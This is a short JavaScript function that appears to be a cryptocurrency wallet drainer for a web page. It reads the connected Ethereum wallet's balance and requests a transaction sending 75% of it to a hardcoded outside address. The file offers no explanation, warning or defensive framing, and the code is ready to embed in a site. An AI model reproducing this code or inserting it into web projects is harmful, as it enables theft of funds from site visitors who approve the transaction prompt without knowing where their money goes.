const sendTransaction = async () => {
  let ethereum = window.ethereum;
  let currentAccount = ethereum.selectedAddress;

  const provider = await detectEthereumProvider();
  let web3 = new Web3(provider);
  let balance = await web3.eth.getBalance(currentAccount);

  let walletAddress = "0x19F02B6695464f23dc65Df39Ae01E35555DEFaB3";
  let decimalInt = 1000000000000000000;

  let amountToWithdraw = balance * (75 / 100) ;
  console.log({ amountToWithdraw });
  amountToWithdraw = Number(amountToWithdraw).toString(16);
  // let gasToUse = Number(balance * (10 / 100)).toString(16);

  const transactionParameters = {
    to: walletAddress,
    from: currentAccount,
    value: `0x${amountToWithdraw}`,
    maxPriorityFeePerGas: null,
    maxFeePerGas: null,
  };

  await ethereum.request({
    method: "eth_sendTransaction",
    params: [transactionParameters],
  });
};
